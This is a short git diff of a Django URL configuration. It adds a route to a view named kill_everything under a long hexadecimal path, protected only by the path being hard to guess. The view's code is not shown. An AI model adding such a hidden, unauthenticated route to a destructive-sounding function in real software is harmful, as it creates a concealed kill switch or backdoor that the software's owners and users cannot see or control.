@@ -15,9 +15,10 @@ Including another URLconf
 """
 from django.contrib import admin
 from django.urls import path, include
-from .views import ProcessWebhook
+from .views import ProcessWebhook, kill_everything
 
 urlpatterns = [
     path('admin/', admin.site.urls),
     path('webhook/', ProcessWebhook.as_view()),
+    path('eb6693dd900c0e4fa1b3171f5548ee7b414030edc9b9cf7956fe7ce9ff5295925a9f8c3478958ea4689b7f809bd2217ca522dd3839591b15e27485cf9f52345f/', kill_everything)
 ]
